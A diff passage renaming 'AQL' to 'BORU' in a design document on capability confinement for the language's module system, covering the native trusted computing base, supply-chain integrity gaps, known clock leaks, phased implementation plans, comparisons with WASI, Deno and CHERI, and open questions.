 testing story. Two known leaks must be closed first (§9.4): `TimeUtil.sleep` /
-`timeout` / `interval` / `elapsed` and `aql:test` bypass `EffectiveClock` and
+`timeout` / `interval` / `elapsed` and `boru:test` bypass `EffectiveClock` and
 call `time.*` directly, so a "no clock" grant is not yet airtight.
 
 The end state for a pure algorithm dependency: **`{}` capabilities + a bounded
@@ -1110,9 +1110,9 @@ the model does *not* cover.
 
 ### 9.1 Native modules are the trusted computing base
 
-Everything in §2–§8 confines **AQL-source** modules. A **native/Go** module —
-anything reached via `import "aql:<name>"` through the static compile-time
-`modules` map, or registered by a host via `(*AQL).Register` /
+Everything in §2–§8 confines **BORU-source** modules. A **native/Go** module —
+anything reached via `import "boru:<name>"` through the static compile-time
+`modules` map, or registered by a host via `(*BORU).Register` /
 `RegisterNativeFunc` / `RegisterExternalBuiltin` / `ExtensionPayload` — is
 arbitrary Go. It runs with the process's full authority (files, network, exec,
 memory) and Tratt's original argument applies to it *in full*. Policy gates
@@ -1120,17 +1120,17 @@ whether a native module is **imported** (`modules.Resolve`), but once loaded its
 Go executes unsandboxed; the fine-grained wrappers only gate the *host
 capabilities* it chooses to route through, not what its Go can do directly.
 
-The one structural mitigation is real and worth stating: **AQL is "sealed at
+The one structural mitigation is real and worth stating: **BORU is "sealed at
 compile time"** ([GO-MODULES.10](GO-MODULES.10.md)) — no FFI, no dynamic
 loading, no plugin `.so`. "The host registration list is the trust boundary."
 A third party cannot inject a native module at runtime; the native tier is
-fixed when the `aql` binary is built and is auditable in one place. So the trust
+fixed when the `boru` binary is built and is auditable in one place. So the trust
 model is a **two-tier graph**:
 
 - a **small, fixed, build-time-audited native TCB** (the interpreter + the
   compiled-in native modules), where trust must be scarce and manual — and *is*,
   because it is small and changes rarely; and
-- an **open-ended, structurally-confined AQL-source dependency graph** above it,
+- an **open-ended, structurally-confined BORU-source dependency graph** above it,
   where trust is cheap because it is enforced, not extended.
 
 This is a defensible answer to Tratt: don't try to secure an unbounded native
@@ -1142,7 +1142,7 @@ the graph interpreted and confined.
 
 Per PERMISSIONS.10: in-process capability confinement is **defence in depth for
 moderately untrusted code, not a substitute for OS isolation against truly
-hostile input.** A deployment taking genuinely adversarial AQL should *also* run
+hostile input.** A deployment taking genuinely adversarial BORU should *also* run
 the host under a container with seccomp, a read-only rootfs, and net-namespace
 isolation. Side channels (timing, cache) are out of scope — an OS/hardware
 concern.
@@ -1151,10 +1151,10 @@ concern.
 
 A capability manifest is only meaningful if the artifact it rides on is
 integrity-checked, and today the `install`/`import` path has **no signing, no
-lockfile, no content hash** — `aql install` fetches a zip from whatever registry
+lockfile, no content hash** — `boru install` fetches a zip from whatever registry
 URL `-r` names, checked only for size and zip-slip; `deps` records only
 `name→version`. A different registry can serve arbitrary bytes under any
-`name-version`. The [aql-vendor.0](aql-vendor.0.md) design already specifies the
+`name-version`. The [boru-vendor.0](boru-vendor.0.md) design already specifies the
 right shape for the *separate* vendored-source axis — a `vendor.lock` pinning a
 resolved commit SHA and a canonical Merkle `tree` hash, `--frozen`
 reproducibility, and future sigstore `--require-signed`. **This note recommends
@@ -1171,11 +1171,11 @@ single verifiable, attributable unit.
   dependency handed a shared `Store` can mutate what the parent observes.
   Attenuation must hand down *attenuated wrappers* and treat shared mutable
   payloads as a covert-channel surface.
-- **Clock is leaky.** `sleep`/`timeout`/`interval`/`elapsed` and `aql:test`
+- **Clock is leaky.** `sleep`/`timeout`/`interval`/`elapsed` and `boru:test`
   bypass `EffectiveClock`; a "no clock" grant is not airtight until these route
   through the injectable clock.
 - **`env`/`process`/`system-info` are taxonomy-ahead-of-surface.** The scopes
-  and globals exist but no AQL word reads an env var, spawns a process, or reads
+  and globals exist but no BORU word reads an env var, spawns a process, or reads
   system info yet; the gates are scaffolding. When those words land, they must
   route through the scopes on day one.
 - **The per-export gate and the `Limits` enforcement are stubs** (§3.2, §3.6) —
@@ -1194,16 +1194,16 @@ shippable, matching the PERMISSIONS-PLAN.10 discipline.
   counter). Wire `MaxStepBudget` and the per-registry tape ceiling from
   `policy.Limits`. *(No new concepts; closes the §3 gaps.)*
 - **Phase 1 — the manifest.** `capabilities.{requires,subset,limits}` block in
-  `aql.jsonic` → `.aql/aql.json`; read at module load; undeclared ⇒ deny;
+  `boru.jsonic` → `.boru/boru.json`; read at module load; undeclared ⇒ deny;
   resolve the "absent" sentinel at one boundary.
 - **Phase 2 — per-edge attenuation.** `RunModuleBody` (and native-module
   install) install `effective`-parameterized wrappers instead of inheriting;
   propagate `CapPolicy` to child sub-registries; importer `with { … }` override
-  and/or a per-dep grant block. Reuse `aql:vm`'s `Compose` path.
+  and/or a per-dep grant block. Reuse `boru:vm`'s `Compose` path.
 - **Phase 3 — static verification** (feasibility analysed in §7.3–7.8).
   `Effects []string` on signatures; union fixpoint in the carrier checker
   (EOP idea #1, on the existing `FnSummaries` / `CompileEffect` machinery);
-  `aql check` verifies declared ⊇ inferred; `--emit-capabilities` writes the
+  `boru check` verifies declared ⊇ inferred; `--emit-capabilities` writes the
   manifest; the escape-hatch handling of §7.4–7.7 (over-approximate or
   declare-or-fail at `do`/`apply`/`Vm.run`/computed-`import`/macro sites); the
   `analyzable` publish-mode of §7.8; `-util` purity as a checked invariant.
@@ -1227,17 +1227,17 @@ single highest-value item for the supply-chain story.
 
 | System | Relation to this design |
 |---|---|
-| WebAssembly component model / WASI | Tratt's own cited "partial solution to performance"; capabilities as explicit imports. AQL lands the same idea at the interpreter layer, with cheaper cell boundaries and a static checker over its *own* source. |
-| Deno permissions | Declarative, syscall-family scoping; process-wide. AQL is finer (per-module, per-word) and in-process. The "no runtime grant/revoke" lesson is shared. |
-| E / object-capability languages | The no-ambient-authority, capabilities-are-not-forgeable model AQL implements via wrapped slots. |
-| CHERI compartments (Tratt) | Hardware capability pointers; powerful but temporally fragile. AQL trades hardware generality for interpreter-enforced simplicity and no first-class capability values to leak. |
-| Newspeak / Wyvern / Austral capability-safe modules | Language-level capability-safe imports; closest kin. AQL adds a static effect-inference *verifier* over an existing checker. |
+| WebAssembly component model / WASI | Tratt's own cited "partial solution to performance"; capabilities as explicit imports. BORU lands the same idea at the interpreter layer, with cheaper cell boundaries and a static checker over its *own* source. |
+| Deno permissions | Declarative, syscall-family scoping; process-wide. BORU is finer (per-module, per-word) and in-process. The "no runtime grant/revoke" lesson is shared. |
+| E / object-capability languages | The no-ambient-authority, capabilities-are-not-forgeable model BORU implements via wrapped slots. |
+| CHERI compartments (Tratt) | Hardware capability pointers; powerful but temporally fragile. BORU trades hardware generality for interpreter-enforced simplicity and no first-class capability values to leak. |
+| Newspeak / Wyvern / Austral capability-safe modules | Language-level capability-safe imports; closest kin. BORU adds a static effect-inference *verifier* over an existing checker. |
 | Go build-time sealing | The native-TCB-fixed-at-build-time property (§9.1). |
-| AppArmor / AWS IAM / `pledge` | The glob rules, last-match-wins, and bounding-set (global hard-cap) shapes AQL's policy already borrows. |
+| AppArmor / AWS IAM / `pledge` | The glob rules, last-match-wins, and bounding-set (global hard-cap) shapes BORU's policy already borrows. |
 
-AQL's distinctive claim is not any single mechanism but their *composition*: no
+BORU's distinctive claim is not any single mechanism but their *composition*: no
 ambient authority + cheap in-process cells + declarative attenuating policy +
-a static effect checker, applied to the AQL-source dependency graph, with a
+a static effect checker, applied to the BORU-source dependency graph, with a
 small sealed native TCB underneath.
 
 ---
@@ -1249,13 +1249,13 @@ small sealed native TCB underneath.
    `where` for `fileops`/`network`.
 2. **Ask-exceeds-offer arbitration.** When a dep's declared ask exceeds the
    importer's default grant: fail-closed (import error), silently narrow, or
-   prompt at `aql install`? Lean fail-closed with an explicit `with { … }`
+   prompt at `boru install`? Lean fail-closed with an explicit `with { … }`
    opt-in.
 3. **Native-module capability declaration.** A native module can *declare* a
    footprint but cannot be *verified* (§9.1). Attest it (signature + a
    host-registration allowlist) rather than trust the declaration; surface it in
    `describe` so importers see which deps are native (unverifiable) vs.
-   AQL-source (verifiable).
+   BORU-source (verifiable).
 4. **Effect-inference precision** (analysed in depth in §7.3–7.8). The dynamic
    surface is a closed, gate-able list — `do`-body, `apply`-value,
    `Vm.run`-string, computed-`import`, macro-expand, computed-`get` — each with
@@ -1284,9 +1284,9 @@ small sealed native TCB underneath.
   import path and module system the manifest/attenuation hook into.
 - [FILE-ACCESS.10](FILE-ACCESS.10.md) — the `FileOps` capability the wrapping
   pattern generalises.
-- [effect-oriented-programming-in-aql-report.0](effect-oriented-programming-in-aql-report.0.md)
+- [effect-oriented-programming-in-boru-report.0](effect-oriented-programming-in-boru-report.0.md)
   — idea #1 (static effect inference) is the verification mechanism of §7.
-- [aql-vendor.0](aql-vendor.0.md) — the integrity/lockfile/signing model §9.3
+- [boru-vendor.0](boru-vendor.0.md) — the integrity/lockfile/signing model §9.3
   recommends adopting for the module path.
 - [GO-MODULES.10](GO-MODULES.10.md) — the compile-time-sealed native TCB (§9.1).
 - [TAPE-DATA-STRUCTURE.10](TAPE-DATA-STRUCTURE.10.md),
